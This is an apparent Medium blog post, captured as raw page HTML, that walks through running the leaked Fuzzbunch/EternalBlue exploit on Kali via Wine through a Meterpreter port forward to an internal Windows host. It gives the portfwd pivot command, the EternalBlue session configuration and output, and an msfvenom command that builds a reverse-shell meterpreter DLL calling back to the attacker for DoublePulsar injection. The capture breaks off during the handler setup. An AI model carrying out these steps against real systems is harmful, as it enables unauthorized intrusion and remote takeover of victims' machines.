NSA Finest Tool

Running Fuzzbunch on Kali Through a Meterpreter Port Forward

Running Fuzzbunch on Kali Through a Meterpreter Port Forward
<link rel="canonical" href="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724"><meta name="title" content="Running Fuzzbunch on Kali Through a Meterpreter Port Forward"><meta name="referrer" content="unsafe-url"><meta name="description" content="Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are people working hard to port the exploits over to Metasploit…"><meta name="theme-color" content="#000000"><meta property="og:title" content="Running Fuzzbunch on Kali Through a Meterpreter Port Forward"><meta property="twitter:title" content="Running Fuzzbunch on Kali Through a Meterpreter Port Forward"><meta property="og:url" content="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724"><meta property="og:image" content="https://cdn-images-1.medium.com/max/1200/1*P4Jga1j8eU0oEfDTmhTV1g.png"><meta property="fb:app_id" content="542599432471018"><meta property="og:description" content="Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are…"><meta name="twitter:description" content="Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are…"><meta name="twitter:image:src" content="https://cdn-images-1.medium.com/max/1200/1*P4Jga1j8eU0oEfDTmhTV1g.png"><link rel="publisher" href="https://plus.google.com/103654360130207659246"><link rel="author" href="https://medium.com/@joe_norton"><meta property="author" content="Joe Norton"><meta property="og:type" content="article"><meta name="twitter:card" content="summary_large_image"><meta property="article:publisher" content="https://www.facebook.com/medium"><meta property="article:author" content="https://medium.com/@joe_norton"><meta name="robots" content="index, follow"><meta property="article:published_time" content="2017-05-29T23:46:14.299Z"><meta name="twitter:site" content="@Medium"><meta property="og:site_name" content="Medium"><meta name="twitter:label1" value="Reading time"><meta name="twitter:data1" value="7 min read"><meta name="twitter:app:name:iphone" content="Medium"><meta name="twitter:app:id:iphone" content="828256236"><meta name="twitter:app:url:iphone" content="medium://p/edd877dfd724"><meta property="al:ios:app_name" content="Medium"><meta property="al:ios:app_store_id" content="828256236"><meta property="al:android:package" content="com.medium.reader"><meta property="al:android:app_name" content="Medium"><meta property="al:ios:url" content="medium://p/edd877dfd724"><meta property="al:android:url" content="medium://p/edd877dfd724"><meta property="al:web:url" content="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724"><link rel="search" type="application/opensearchdescription+xml" title="Medium" href="/osd.xml" /><link rel="alternate" href="android-app://com.medium.reader/https/medium.com/p/edd877dfd724" /><script type="application/ld+json">{"@context":"http://schema.org","@type":"NewsArticle","image":{"@type":"ImageObject","width":580,"height":752,"url":"https://cdn-images-1.medium.com/max/580/1*P4Jga1j8eU0oEfDTmhTV1g.png"},"url":"https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724","dateCreated":"2017-05-29T23:46:14.299Z","datePublished":"2017-05-29T23:46:14.299Z","dateModified":"2018-03-19T17:40:16.570Z","headline":"Running Fuzzbunch on Kali Through a Meterpreter Port Forward","name":"Running Fuzzbunch on Kali Through a Meterpreter Port Forward","thumbnailUrl":"https://cdn-images-1.medium.com/max/580/1*P4Jga1j8eU0oEfDTmhTV1g.png","keywords":["Tag:Hacking","Tag:Eternalblue","Tag:Ms17 010","Tag:Fuzzbunch","LockedPostSource:0","Elevated:false","LayerCake:0"],"author":{"@type":"Person","name":"Joe Norton","url":"https://medium.com/@joe_norton"},"creator":["Joe Norton"],"publisher":{"@type":"Organization","name":"Medium","url":"https://medium.com/","logo":{"@type":"ImageObject","width":308,"height":60,"url":"https://cdn-images-1.medium.com/max/308/1*OMF3fSqH8t4xBJ9-6oZDZw.png"}},"mainEntityOfPage":"https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724"}</script><meta name="parsely-link" content="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724"><link rel="stylesheet" type="text/css" class="js-glyph-" id="glyph-8" href="https://glyph.medium.com/css/e/sr/latin/e/ssr/latin/e/ssb/latin/m2.css" /><link rel="stylesheet" href="https://cdn-static-1.medium.com/_/fp/css/main-branding-base.zClBbVDUJM0lcrJm6R68Zw.css"><script>if (window.top !== window.self) window.top.location = window.self.location.href;var OB_startTime = new Date().getTime(); var OB_loadErrors = []; function _onerror(e) { OB_loadErrors.push(e) }; if (document.addEventListener) document.addEventListener("error", _onerror, true); else if (document.attachEvent) document.attachEvent("onerror", _onerror); function _asyncScript(u) {var d = document, f = d.getElementsByTagName("script")[0], s = d.createElement("script"); s.type = "text/javascript"; s.async = true; s.src = u; f.parentNode.insertBefore(s, f);}function _asyncStyles(u) {var d = document, f = d.getElementsByTagName("script")[0], s = d.createElement("link"); s.rel = "stylesheet"; s.href = u; f.parentNode.insertBefore(s, f); return s}(new Image()).src = "/_/stat?event=pixel.load&origin=" + encodeURIComponent(location.origin);</script><script>window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date; ga("create", "UA-24232453-2", "auto", {"allowLinker": true, "legacyCookieDomain": window.location.hostname}); ga("send", "pageview");</script><script async src="https://www.google-analytics.com/analytics.js"></script><!--[if lt IE 9]><script charset="UTF-8" src="https://cdn-static-1.medium.com/_/fp/js/shiv.RI2ePTZ5gFmMgLzG5bEVAA.js"></script><![endif]--><link rel="icon" href="https://cdn-static-1.medium.com/_/fp/icons/favicon-rebrand-medium.3Y6xpZ-0FSdWDnPM3hSBIA.ico" class="js-favicon"><link rel="apple-touch-icon" sizes="152x152" href="https://cdn-images-1.medium.com/fit/c/152/152/1*8I-HPL0bfoIzGied-dzOvA.png"><link rel="apple-touch-icon" sizes="120x120" href="https://cdn-images-1.medium.com/fit/c/120/120/1*8I-HPL0bfoIzGied-dzOvA.png"><link rel="apple-touch-icon" sizes="76x76" href="https://cdn-images-1.medium.com/fit/c/76/76/1*8I-HPL0bfoIzGied-dzOvA.png"><link rel="apple-touch-icon" sizes="60x60" href="https://cdn-images-1.medium.com/fit/c/60/60/1*8I-HPL0bfoIzGied-dzOvA.png"><link rel="mask-icon" href="https://cdn-static-1.medium.com/_/fp/icons/monogram-mask.KPLCSFEZviQN0jQ7veN2RQ.svg" color="#171717"></head><body itemscope class=" postShowScreen browser-chrome os-windows is-withMagicUnderlines v-glyph v-glyph--m2 is-noJs"><script>document.body.className = document.body.className.replace(/(^|\s)is-noJs(\s|$)/, "$1is-js$2")</script><div class="site-main" id="container"><div class="butterBar butterBar--error"></div><div class="surface"><div id="prerendered" class="screenContent"><canvas class="canvas-renderer"></canvas><div class="container u-maxWidth740 u-xs-margin0 notesPositionContainer js-notesPositionContainer"></div><div class="metabar u-clearfix js-metabar u-boxShadow4px12pxBlackLightest u-fixed u-backgroundTransparentWhiteDarkest u-xs-sizeFullViewportWidth"><div class="branch-journeys-top"></div><div class="js-metabarMiddle metabar-inner u-marginAuto u-maxWidth1032 u-flexCenter u-justifyContentSpaceBetween u-height65 u-xs-height56 u-paddingHorizontal20"><div class="metabar-block u-flex1 u-flexCenter"><div class="u-xs-hide js-metabarLogoLeft"><a href="https://medium.com/" data-log-event="home" class="siteNav-logo u-fillTransparentBlackDarker u-flex0 u-flexCenter u-paddingTop0"><span class="svgIcon svgIcon--logoMonogram svgIcon--45px is-flushLeft u-flex0 u-flexCenter u-paddingTop0"><svg class="svgIcon-use" width="45" height="45" ><path d="M5 40V5h35v35H5zm8.56-12.627c0 .555-.027.687-.318 1.03l-2.457 2.985v.396h6.974v-.396l-2.456-2.985c-.291-.343-.344-.502-.344-1.03V18.42l6.127 13.364h.714l5.256-13.364v10.644c0 .29 0 .342-.185.528l-1.848 1.796v.396h9.19v-.396l-1.822-1.796c-.184-.186-.21-.238-.21-.528V15.937c0-.291.026-.344.21-.528l1.823-1.797v-.396h-6.471l-4.622 11.542-5.203-11.542h-6.79v.396l2.14 2.64c.239.292.291.37.291.768v10.353z"/></svg></span><span class="u-textScreenReader">Homepage</span></a></div><div class="u-xs-show js-metabarLogoLeft"><a href="https://medium.com/" data-log-event="home" class="siteNav-logo u-fillTransparentBlackDarker u-flex0 u-flexCenter u-paddingTop0"><span class="svgIcon svgIcon--logoMonogram svgIcon--45px is-flushLeft u-flex0 u-flexCenter u-paddingTop0"><svg class="svgIcon-use" width="45" height="45" ><path d="M5 40V5h35v35H5zm8.56-12.627c0 .555-.027.687-.318 1.03l-2.457 2.985v.396h6.974v-.396l-2.456-2.985c-.291-.343-.344-.502-.344-1.03V18.42l6.127 13.364h.714l5.256-13.364v10.644c0 .29 0 .342-.185.528l-1.848 1.796v.396h9.19v-.396l-1.822-1.796c-.184-.186-.21-.238-.21-.528V15.937c0-.291.026-.344.21-.528l1.823-1.797v-.396h-6.471l-4.622 11.542-5.203-11.542h-6.79v.396l2.14 2.64c.239.292.291.37.291.768v10.353z"/></svg></span><span class="u-textScreenReader">Homepage</span></a></div></div><div class="metabar-block u-flex0"><div class="buttonSet buttonSet--wide"><a class="button button--chromeless u-baseColor--buttonNormal u-xs-hide js-upgradeMembershipAction"   href="https://medium.com/membership?source=upgrade_membership---nav_full">Become a member</a><a class="button button--primary button--chromeless u-accentColor--buttonNormal is-inSiteNavBar u-xs-hide js-signInButton"   href="https://medium.com/m/signin?redirect=https%3A%2F%2Fmedium.com%2F%40joe_norton%2Frunning-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724&amp;source=--------------------------nav_reg&amp;operation=login" data-action="sign-in-prompt" data-redirect="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724" data-action-source="--------------------------nav_reg">Sign in</a><a class="button button--primary button--withChrome u-accentColor--buttonNormal is-inSiteNavBar js-signUpButton"   href="https://medium.com/m/signin?redirect=https%3A%2F%2Fmedium.com%2F%40joe_norton%2Frunning-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724&amp;source=--------------------------nav_reg&amp;operation=register" data-action="sign-up-prompt" data-redirect="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724" data-action-source="--------------------------nav_reg">Get started</a></div></div></div></div><div class="metabar metabar--spacer js-metabarSpacer u-height65 u-xs-height56"></div><main role="main"><article class=" u-minHeight100vhOffset65 u-overflowHidden postArticle postArticle--full u-marginBottom40"  lang="en"><header class="container u-maxWidth740"></header><div class="postArticle-content js-postField js-notesSource js-trackedPost"  data-post-id="edd877dfd724" data-source="post_page" data-tracking-context="postPage"><section name="e24d" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h1 name="29e2" id="29e2" class="graf graf--h3 graf--leading graf--title">Running Fuzzbunch on Kali Through a Meterpreter Port Forward</h1><div class="uiScale uiScale-ui--regular uiScale-caption--regular u-flexCenter u-marginVertical24 u-fontSize15 js-postMetaLockup"><div class="u-flex0"><a class="link u-baseColor--link avatar"   href="https://medium.com/@joe_norton?source=post_header_lockup" data-action="show-user-card" data-action-source="post_header_lockup" data-action-value="5652bace719b" data-action-type="hover" data-user-id="5652bace719b" dir="auto"><img  src="https://cdn-images-1.medium.com/fit/c/50/50/1*dmbNkD5D-u45r44go_cf0g.png" class="avatar-image u-size50x50" alt="Go to the profile of Joe Norton"></a></div><div class="u-flex1 u-paddingLeft15 u-overflowHidden"><div class="u-paddingBottom3"><a class="ds-link ds-link--styleSubtle ui-captionStrong u-inlineBlock link link--darken link--darker"   href="https://medium.com/@joe_norton" data-action="show-user-card" data-action-value="5652bace719b" data-action-type="hover" data-user-id="5652bace719b" dir="auto">Joe Norton</a><span class="followState js-followState" data-user-id="5652bace719b"><button class="button button--smallest u-noUserSelect button--withChrome u-baseColor--buttonNormal button--withHover button--unblock js-unblockButton u-marginLeft10 u-xs-hide"  data-action="sign-up-prompt" data-sign-in-action="toggle-block-user" data-requires-token="true" data-redirect="https://medium.com/@joe_norton/running-eternalblue-on-kali-through-a-meterpreter-port-forward-edd877dfd724" data-action-source="post_header_lockup"><span class="button-label  button-defaultState">Blocked</span><span class="button-label button-hoverState">Unblock</span></button><button class="button button--primary button--smallest button--dark u-noUserSelect button--withChrome u-accentColor--buttonDark button--follow js-followButton u-marginLeft10 u-xs-hide"  data-action="sign-up-prompt" data-sign-in-action="toggle-subscribe-user" data-requires-token="true" data-redirect="https://medium.com/_/subscribe/user/5652bace719b" data-action-source="post_header_lockup-5652bace719b-------------------------follow_byline"><span class="button-label  button-defaultState js-buttonLabel">Follow</span><span class="button-label button-activeState">Following</span></button></span></div><div class="ui-caption postMetaInline js-testPostMetaInlineSupplemental"><time datetime="2017-05-29T23:46:14.299Z">May 30, 2017</time><span class="middotDivider u-fontSize12"></span><span class="readingTime" title="7 min read"></span></div></div></div><p name="1d10" id="1d10" class="graf graf--p graf-after--h3">Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are people working hard to <a href="https://github.com/RiskSense-Ops/MS17-010" data-href="https://github.com/RiskSense-Ops/MS17-010" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">port the exploits over to Metasploit</a>, currently the only supported versions are x64 Windows7 and Windows 2008R2, whereas the actual Eternalblue exploit in the Equation Group leak can exploit x86 versions of 7/2008 and XP.</p><p name="0313" id="0313" class="graf graf--p graf-after--p">The Equation Group leak has been ported to Linux via wine and this new Linux friendly version can be downloaded here — <a href="https://github.com/mdiazcl/fuzzbunch-debian" data-href="https://github.com/mdiazcl/fuzzbunch-debian" class="markup--anchor markup--p-anchor" rel="nofollow noopener nofollow noopener" target="_blank">https://github.com/mdiazcl/fuzzbunch-debian</a>. Fuzzbunch is the name of the framework used that contains Eternalblue, Doublepulsar and several other exploits. I won’t go through the setup in this post since the readme in the github repo does a great job of explaining how to get this running on Kali.</p><p name="213a" id="213a" class="graf graf--p graf-after--p">In my previous post I went over how to attack internal hosts through a meterpreter session using Metasploit’s socks4a proxy services. This technique works great for most of the network based scanning and attack tools in Kali but was not effective for fuzzbunch in wine.</p><p name="d890" id="d890" class="graf graf--p graf-after--p">Another pivoting option that Metasploit offers is portfwd. Once you establish a meterpreter shell to an internal machine you can forward individual ports directly to internal hosts. The attacker machine will start listening on the port specified, with that port being bound to the running metasploit instance, which in turn forwards the traffic through the meterpreter session to whatever destination IP is defined in the portfwd command.</p><p name="70e7" id="70e7" class="graf graf--p graf-after--p">In this scenario we have the attacker -10.0.0.35 on one side of the firewall with an established meterpreter session to 192.168.55.100.</p><figure name="c71c" id="c71c" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 549px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 78.4%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*YWkR0KDY3TLvNwlGoF0s9w.png" data-width="821" data-height="644" data-action="zoom" data-action-value="1*YWkR0KDY3TLvNwlGoF0s9w.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*YWkR0KDY3TLvNwlGoF0s9w.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*YWkR0KDY3TLvNwlGoF0s9w.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*YWkR0KDY3TLvNwlGoF0s9w.png"></noscript></div></div><figcaption class="imageCaption">Visio Depicting the Network Layout of the Scenario</figcaption></figure><p name="11de" id="11de" class="graf graf--p graf-after--figure">Once the pivot host’s externally facing service is compromised and a meterpreter shell is achieved, we need to configure portfwd to relay traffic to internal hosts. The command in this case would be:</p><pre name="9971" id="9971" class="graf graf--pre graf-after--p">portfwd add -l 9000 -p 445 -r 192.168.55.65</pre><p name="55a2" id="55a2" class="graf graf--p graf-after--pre">The breakdown of the command is like this:</p><p name="bebc" id="bebc" class="graf graf--p graf--startsWithDoubleQuote graf-after--p">“-l 9000” : The port that will receive the traffic on the attacker host</p><p name="c32b" id="c32b" class="graf graf--p graf--startsWithDoubleQuote graf-after--p">“-p 445” : The port on the internal victim that will be accessed</p><p name="6e0f" id="6e0f" class="graf graf--p graf--startsWithDoubleQuote graf-after--p">“ -r 192.168.55.65” : The internal victim</p><figure name="cd39" id="cd39" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 123px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 17.5%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*wQlfph0fKZ88G__-P3N4mg.png" data-width="1137" data-height="199" data-action="zoom" data-action-value="1*wQlfph0fKZ88G__-P3N4mg.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*wQlfph0fKZ88G__-P3N4mg.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*wQlfph0fKZ88G__-P3N4mg.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*wQlfph0fKZ88G__-P3N4mg.png"></noscript></div></div><figcaption class="imageCaption">Pivot Machine is Exploited and portfwd is Configured for Attacking an Internal Host</figcaption></figure><p name="c76c" id="c76c" class="graf graf--p graf-after--figure">Once the the portfwd is established, the attacker machine is listening on port 9000 and anything sent to that port will reach the internal victim on the defined destination port. As our first test, we can scan the new internal victim to confirm it is vulnerable to the Eternalblue exploit by using auxiliary/scanner/smb/smb_ms17_010.</p><figure name="040b" id="040b" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 240px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 34.300000000000004%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*oqwdmK9Wrv5H5fGVEyWp5w.png" data-width="1416" data-height="485" data-action="zoom" data-action-value="1*oqwdmK9Wrv5H5fGVEyWp5w.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*oqwdmK9Wrv5H5fGVEyWp5w.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*oqwdmK9Wrv5H5fGVEyWp5w.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*oqwdmK9Wrv5H5fGVEyWp5w.png"></noscript></div></div><figcaption class="imageCaption">Scanning The Internal Host for MS17–010 Vulnerability</figcaption></figure><p name="e1ae" id="e1ae" class="graf graf--p graf-after--figure">The traffic flow in this example is as follows:</p><figure name="ea36" id="ea36" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 580px; max-height: 752px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 129.7%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*P4Jga1j8eU0oEfDTmhTV1g.png" data-width="580" data-height="752" data-is-featured="true"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*P4Jga1j8eU0oEfDTmhTV1g.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*P4Jga1j8eU0oEfDTmhTV1g.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*P4Jga1j8eU0oEfDTmhTV1g.png"></noscript></div></div></figure><p name="eb53" id="eb53" class="graf graf--p graf-after--figure">Everything is in place to start using fuzzbunch to exploit the internal host. In a new terminal on the attacker machine, start fuzzbunch by running:</p><pre name="1b2b" id="1b2b" class="graf graf--pre graf-after--p">#!/bin/bash<br>export WINEPREFIX=$HOME/.wine-fuzzbunch<br>cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows<br>wine cmd.exe<br>python fb.py</pre><p name="2af2" id="2af2" class="graf graf--p graf-after--pre">Once fuzzbunch has been launched you need to set the default target IP, callback IP, and project. The target and callback can be changed later and you’re not locked into using these the entire session.</p><pre name="5e12" id="5e12" class="graf graf--pre graf-after--p">[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage</pre><pre name="284b" id="284b" class="graf graf--pre graf-after--pre">[*] Retargetting Session</pre><pre name="13d0" id="13d0" class="graf graf--pre graf-after--pre">[?] Default Target IP Address [] : 127.0.0.1<br>[?] Default Callback IP Address [] : 10.0.0.35<br>[?] Use Redirection [yes] :</pre><pre name="44bd" id="44bd" class="graf graf--pre graf-after--pre">[?] Base Log directory [C:\fuzzbunch-debian\logs] : <br>[*] Checking C:\fuzzbunch-debian\logs for projects<br>Index     Project                 <br>-----     -------                 <br>0         eternalblue-pivot       <br>1         testing                 <br>2         test                    <br>3         Create a New Project</pre><pre name="1fd6" id="1fd6" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">[?] Project [0] : 0</strong><br>[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\eternalblue-pivot\z127.0.0.1&#39;? [Yes] :</pre><pre name="69dc" id="69dc" class="graf graf--pre graf-after--pre">[*] Initializing Global State<br><strong class="markup--strong markup--pre-strong">[+] Set TargetIp =&gt; 127.0.0.1<br>[+] Set CallbackIp =&gt; 10.0.0.35</strong></pre><pre name="0cae" id="0cae" class="graf graf--pre graf-after--pre">[+] Redirection ON<br>[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\eternalblue-pivot\z127.0.0.1<br>[+] Set Project =&gt; eternalblue-pivot</pre><pre name="b292" id="b292" class="graf graf--pre graf-after--pre">fb &gt;</pre><p name="6a80" id="6a80" class="graf graf--p graf-after--pre">After that we’ll launch eternalblue, which will pull in the IP info we just entered:</p><pre name="d0fa" id="d0fa" class="graf graf--pre graf-after--p">fb &gt; use eternalblue</pre><pre name="a415" id="a415" class="graf graf--pre graf-after--pre">[!] Entering Plugin Context :: Eternalblue<br>[*] Applying Global Variables<br>[+] Set NetworkTimeout =&gt; 60<br>[+] Set TargetIp =&gt; <strong class="markup--strong markup--pre-strong">127.0.0.1</strong></pre><pre name="74e1" id="74e1" class="graf graf--pre graf-after--pre">[*] Applying Session Parameters<br>[*] Running Exploit Touches</pre><pre name="c188" id="c188" class="graf graf--pre graf-after--pre">[!] Enter Prompt Mode :: Eternalblue</pre><pre name="20fe" id="20fe" class="graf graf--pre graf-after--pre">Module: Eternalblue<br>===================</pre><pre name="48ef" id="48ef" class="graf graf--pre graf-after--pre">Name                  Value                                                 <br>----                  -----                                                 <br>NetworkTimeout        60                                                    <br>TargetIp              127.0.0.1                                             <br>TargetPort            445                                                   <br>VerifyTarget          True                                                  <br>VerifyBackdoor        True                                                  <br>MaxExploitAttempts    3                                                     <br>GroomAllocations      12                                                    <br>Target                WIN72K8R2</pre><pre name="1baf" id="1baf" class="graf graf--pre graf-after--pre">[!] plugin variables are valid<br>[?] Prompt For Variable Settings? [Yes] :</pre><p name="be8d" id="be8d" class="graf graf--p graf-after--pre">Most of the settings are defaults, but be careful when it comes time to define the target port. In this case we have to use the local port defined in the portfwd command, 9000, as Eternalblue will default to 445. Hit enter at the “Prompt for Variable Settings” prompt to enter the new target port:</p><pre name="fab0" id="fab0" class="graf graf--pre graf-after--p">[?] Prompt For Variable Settings? [Yes] :</pre><pre name="32cd" id="32cd" class="graf graf--pre graf-after--pre">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.</pre><pre name="2e2f" id="2e2f" class="graf graf--pre graf-after--pre">[?] NetworkTimeout [60] :</pre><pre name="61a9" id="61a9" class="graf graf--pre graf-after--pre">[*]  TargetIp :: Target IP Address</pre><pre name="93ed" id="93ed" class="graf graf--pre graf-after--pre">[?] TargetIp [127.0.0.1] :</pre><pre name="e36f" id="e36f" class="graf graf--pre graf-after--pre">[*]  TargetPort :: Port used by the SMB service for exploit connection</pre><pre name="8547" id="8547" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">[?] TargetPort [445] : 9000</strong></pre><p name="6c1a" id="6c1a" class="graf graf--p graf-after--pre">The next setting that will deviate from the defaults is the delivery mechanism. Be sure to select “Traditional deployment from within FUZZBUNCH” here:</p><pre name="8ce2" id="8ce2" class="graf graf--pre graf-after--p">[*]  Mode :: Delivery mechanism</pre><pre name="0aeb" id="0aeb" class="graf graf--pre graf-after--pre">*0) DANE     Forward deployment via DARINGNEOPHYTE<br>    1) FB       Traditional deployment from within FUZZBUNCH</pre><pre name="9f66" id="9f66" class="graf graf--pre graf-after--pre">[?] Mode [0] :1</pre><p name="970a" id="970a" class="graf graf--p graf-after--pre">At this point we’re ready to run the exploit. If everything is setup correctly you should see “WIN” when the exploit is successful. It may take more than one try, but be persistent if you’re sure the host is vulnerable:</p><figure name="25fb" id="25fb" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 713px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 101.8%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*9quX4peexWCBZkXWygJMFQ.png" data-width="997" data-height="1015" data-action="zoom" data-action-value="1*9quX4peexWCBZkXWygJMFQ.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*9quX4peexWCBZkXWygJMFQ.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*9quX4peexWCBZkXWygJMFQ.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*9quX4peexWCBZkXWygJMFQ.png"></noscript></div></div><figcaption class="imageCaption">Eternalblue Being Run in Wine Pointing to 127.0.0.1:9000</figcaption></figure><p name="1656" id="1656" class="graf graf--p graf-after--figure">From the pivot machine we can see that traffic is being forwarded to the internal victim thanks to the meterpeter portfwd:</p><figure name="8ba0" id="8ba0" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 525px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 75%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*Yr4wrPh_KW9FsA77GezcpA.png" data-width="1029" data-height="772" data-action="zoom" data-action-value="1*Yr4wrPh_KW9FsA77GezcpA.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*Yr4wrPh_KW9FsA77GezcpA.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*Yr4wrPh_KW9FsA77GezcpA.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*Yr4wrPh_KW9FsA77GezcpA.png"></noscript></div></div><figcaption class="imageCaption">Pivot Host Shows Traffic Being Forwarded to Target</figcaption></figure><p name="6b3e" id="6b3e" class="graf graf--p graf-after--figure">Once the Eternalblue exploit is succesful, the next step is to use the Doublepulsar module to inject a DLL of our choosing into a process on the victim. In this case we’ll run a DLL that contains a meterpreter payload to establish a reverse shell back to our attacker machine.</p><p name="b6e3" id="b6e3" class="graf graf--p graf-after--p">To generate the payload we’ll use msfvenom and to make things easier we’ll generate the payload in the directory that fuzzbunch is launched from:</p><pre name="8a38" id="8a38" class="graf graf--pre graf-after--p">root@dewey:/# <strong class="markup--strong markup--pre-strong">cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows</strong></pre><pre name="73b2" id="73b2" class="graf graf--pre graf-after--pre">root@dewey:~/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows# <strong class="markup--strong markup--pre-strong">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.35 lport=4444 — platform windows -f dll -o file.dll</strong></pre><pre name="e378" id="e378" class="graf graf--pre graf-after--pre">No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>No Arch selected, selecting Arch: x64 from the payload<br>No encoder or badchars specified, outputting raw payload<br>Payload size: 510 bytes<br>Final size of dll file: 5120 bytes<br><strong class="markup--strong markup--pre-strong">Saved as: file.dll</strong></pre><p name="6c0c" id="6c0c" class="graf graf--p graf-after--pre">We also need to prepare Metasploit to receive the connection from the new victim once the DLL is injected by using exploit/multi/handler, making sure the payload, lport and lhost match our msfvenom command from the previous step:</p><pre name="b3dc" id="b3dc" class="graf graf--pre graf-after--p">msf exploit(handler) &gt; show options</pre><pre name="93b5" id="93b5" class="graf graf--pre graf-after--pre">Module options (exploit/multi/handler):</pre><pre name="4d0e" id="4d0e" class="graf graf--pre graf-after--pre">Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------</pre><pre name="1b27" id="1b27" class="graf graf--pre graf-after--pre">Payload options (<strong 